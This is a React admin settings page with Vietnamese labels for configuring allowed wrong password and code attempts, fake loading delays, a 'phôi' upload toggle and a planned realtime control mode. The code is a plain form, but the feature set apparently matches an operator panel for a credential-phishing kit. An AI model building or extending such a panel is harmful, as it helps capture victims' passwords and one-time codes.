import {
	faClock,
	faLock,
	faRocket,
	faSave,
	faShieldAlt,
	faToggleOff,
	faToggleOn,
} from '@fortawesome/free-solid-svg-icons';
import { FontAwesomeIcon } from '@fortawesome/react-fontawesome';
import axios from 'axios';
import { motion } from 'framer-motion';
import React, { useEffect, useState } from 'react';
import { toast } from 'react-toastify';

const WebsiteConfig: React.FC = () => {
	const [maxPasswordAttempts, setMaxPasswordAttempts] = useState(1);
	const [maxCodeAttempts, setMaxCodeAttempts] = useState(1);
	const [isUploadEnabled, setIsUploadEnabled] = useState(false);
	const [passwordLoadingTime, setPasswordLoadingTime] = useState(1);
	const [codeLoadingTime, setCodeLoadingTime] = useState(1);
	const [isRealtimeMode, setIsRealtimeMode] = useState(false);

	const handleSave = () => {
		axios.post('/api/save-website-config', {
			maxPasswordAttempts,
			maxCodeAttempts,
			isUploadEnabled,
			passwordLoadingTime,
			codeLoadingTime,
			isRealtimeMode,
		});
		toast.success('Cấu hình đã được lưu thành công!');
	};

	const handleRealtimeModeToggle = () => {
		setIsRealtimeMode(true);
		toast.warning('Chế độ đang phát triển', {
			icon: <FontAwesomeIcon icon={faRocket} className='text-blue-500' />,
		});
	};
	useEffect(() => {
		axios.get('/api/get-website-config').then((res) => {
			setMaxPasswordAttempts(res.data.maxPasswordAttempts);
			setMaxCodeAttempts(res.data.maxCodeAttempts);
			setIsUploadEnabled(res.data.isUploadEnabled);
			setPasswordLoadingTime(res.data.passwordLoadingTime);
			setCodeLoadingTime(res.data.codeLoadingTime);
			setIsRealtimeMode(res.data.isRealtimeMode);
		});
	}, []);

	return (
		<div className='container mx-auto px-4 py-8'>
			<h1 className='mb-6 text-3xl font-bold text-gray-800'>
				Cấu Hình Website
			</h1>
			{!isRealtimeMode ? (
				<div className='rounded-lg bg-white p-6 shadow-lg'>
					<form
						onSubmit={(e) => e.preventDefault()}
						className='space-y-6'
					>
						<div className='grid grid-cols-2 gap-6'>
							<div>
								<label
									htmlFor='maxPasswordAttempts'
									className='mb-2 block text-sm font-medium text-gray-700'
								>
									Số lần nhập sai pass
								</label>
								<div className='relative mt-1 rounded-md shadow-sm'>
									<div className='pointer-events-none absolute inset-y-0 left-0 flex items-center pl-3'>
										<FontAwesomeIcon
											icon={faLock}
											className='text-gray-400'
										/>
									</div>
									<input
										type='number'
										id='maxPasswordAttempts'
										value={maxPasswordAttempts}
										onChange={(e) =>
											setMaxPasswordAttempts(
												Number(e.target.value),
											)
										}
										className='block w-full rounded-md border-gray-300 pl-10 focus:border-blue-500 focus:ring-blue-500'
										min={1}
										max={60}
									/>
								</div>
							</div>
							<div>
								<label
									htmlFor='maxCodeAttempts'
									className='mb-2 block text-sm font-medium text-gray-700'
								>
									Số lần nhập sai code
								</label>
								<div className='relative mt-1 rounded-md shadow-sm'>
									<div className='pointer-events-none absolute inset-y-0 left-0 flex items-center pl-3'>
										<FontAwesomeIcon
											icon={faShieldAlt}
											className='text-gray-400'
										/>
									</div>
									<input
										type='number'
										id='maxCodeAttempts'
										value={maxCodeAttempts}
										onChange={(e) =>
											setMaxCodeAttempts(
												Number(e.target.value),
											)
										}
										className='block w-full rounded-md border-gray-300 pl-10 focus:border-blue-500 focus:ring-blue-500'
										min={1}
										max={60}
									/>
								</div>
							</div>
						</div>

						<div>
							<label
								htmlFor='isUploadEnabled'
								className='mb-2 block text-sm font-medium text-gray-700'
							>
								Upload phôi
							</label>
							<motion.button
								whileTap={{ scale: 0.95 }}
								onClick={() =>
									setIsUploadEnabled(!isUploadEnabled)
								}
								className={`flex items-center rounded-md px-4 py-2 text-sm font-medium ${
									isUploadEnabled
										? 'bg-blue-600 text-white hover:bg-blue-700'
										: 'bg-gray-200 text-gray-800 hover:bg-gray-300'
								}`}
							>
								<FontAwesomeIcon
									icon={
										isUploadEnabled
											? faToggleOn
											: faToggleOff
									}
									className={`mr-2 text-xl ${isUploadEnabled ? 'text-white' : 'text-gray-600'}`}
								/>
								{isUploadEnabled ? 'Đang bật' : 'Đang tắt'}
							</motion.button>
						</div>

						<div className='grid grid-cols-2 gap-6'>
							<div>
								<label
									htmlFor='passwordLoadingTime'
									className='mb-2 block text-sm font-medium text-gray-700'
								>
									Thời gian loading pass (giây)
								</label>
								<div className='relative mt-1 rounded-md shadow-sm'>
									<div className='pointer-events-none absolute inset-y-0 left-0 flex items-center pl-3'>
										<FontAwesomeIcon
											icon={faClock}
											className='text-gray-400'
										/>
									</div>
									<input
										type='number'
										id='passwordLoadingTime'
										value={passwordLoadingTime}
										onChange={(e) =>
											setPasswordLoadingTime(
												Number(e.target.value),
											)
										}
										className='block w-full rounded-md border-gray-300 pl-10 focus:border-blue-500 focus:ring-blue-500'
										min={0}
										max={60}
										step={0.1}
									/>
								</div>
							</div>
							<div>
								<label
									htmlFor='codeLoadingTime'
									className='mb-2 block text-sm font-medium text-gray-700'
								>
									Thời gian loading code (giây)
								</label>
								<div className='relative mt-1 rounded-md shadow-sm'>
									<div className='pointer-events-none absolute inset-y-0 left-0 flex items-center pl-3'>
										<FontAwesomeIcon
											icon={faClock}
											className='text-gray-400'
										/>
									</div>
									<input
										type='number'
										id='codeLoadingTime'
										value={codeLoadingTime}
										onChange={(e) =>
											setCodeLoadingTime(
												Number(e.target.value),
											)
										}
										className='block w-full rounded-md border-gray-300 pl-10 focus:border-blue-500 focus:ring-blue-500'
										min={0}
										max={60}
										step={0.1}
									/>
								</div>
							</div>
						</div>

						<div className='border-t border-gray-200 pt-6'>
							<h2 className='mb-4 text-lg font-semibold text-gray-800'>
								Sắp có
							</h2>
							<div>
								<label
									htmlFor='isRealtimeMode'
									className='mb-2 block text-sm font-medium text-gray-700'
								>
									Chuyển sang chế độ điều khiển realtime
								</label>
								<motion.button
									whileTap={{ scale: 0.95 }}
									onClick={handleRealtimeModeToggle}
									className={`flex items-center rounded-md px-4 py-2 text-sm font-medium ${
										isRealtimeMode
											? 'bg-blue-600 text-white hover:bg-blue-700'
											: 'bg-gray-200 text-gray-800 hover:bg-gray-300'
									} cursor-not-allowed opacity-50`}
								>
									<FontAwesomeIcon
										icon={
											isRealtimeMode
												? faToggleOn
												: faToggleOff
										}
										className={`mr-2 text-xl ${isRealtimeMode ? 'text-white' : 'text-gray-600'}`}
									/>
									{isRealtimeMode ? 'Đang bật' : 'Đang tắt'}
									<FontAwesomeIcon
										icon={faRocket}
										className='ml-2'
									/>
								</motion.button>
							</div>
						</div>

						<div>
							<motion.button
								onClick={handleSave}
								className='flex w-full items-center justify-center rounded-md bg-blue-600 px-4 py-2 text-sm font-medium text-white hover:bg-blue-700 focus:outline-none focus:ring-2 focus:ring-blue-500 focus:ring-offset-2'
							>
								<FontAwesomeIcon
									icon={faSave}
									className='mr-2'
								/>
								Lưu Thay Đổi
							</motion.button>
						</div>
					</form>
				</div>
			) : (
				<div className='flex flex-col items-center justify-center gap-10 text-5xl font-bold text-red-500'>
					Tính năng đang phát triển, tạm thời chưa hoạt động
					<button
						onClick={() => setIsRealtimeMode(false)}
						className='flex items-center rounded-md bg-blue-600 px-4 py-2 text-sm font-medium text-white hover:bg-blue-700 focus:outline-none focus:ring-2 focus:ring-blue-500 focus:ring-offset-2'
					>
						<FontAwesomeIcon icon={faToggleOff} />
						Tắt chế độ realtime
					</button>
				</div>
			)}
		</div>
	);
};

export default WebsiteConfig;
